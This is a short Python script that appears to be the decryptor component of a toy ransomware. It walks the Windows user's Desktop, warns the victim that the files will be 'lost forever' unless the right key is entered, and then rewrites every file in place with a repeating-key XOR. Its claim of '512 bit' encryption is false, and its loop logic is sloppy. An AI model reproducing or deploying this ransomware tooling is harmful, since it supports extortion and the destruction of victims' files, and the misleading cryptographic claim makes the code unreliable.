import os
import threading
import queue


# Defining the decryption algrothim

def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file,'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                    # Increment Key Index
                    if key_index >= max_key_index:
                        key_index = 0
                    else:
                        key_index += 1
                print(f'{file} Decryption process is successful')
        except:
            print('Failed to decrypt the file')
        q.task_done()

#Encryption Information
Encryption_level = 512 // 8           #512 bit encyption

#File path to decrypt
print('Files preparing.....')
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print('Files successfully located')


# The key input
print("IF THE KEY IS INCORRECT THE FILES WILL BE LOST FOREVER")
key = input("Enter the decryption KEY if you want your files back: " "\n")

#Setting up queue for threads to decrypt
q = queue.Queue()
for f in abs_files:
    q.put(f)

#Setting up the threads to get ready to decrypt
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()
q.join()

print('DECRYPTION PROCESS IS DONE')
input()



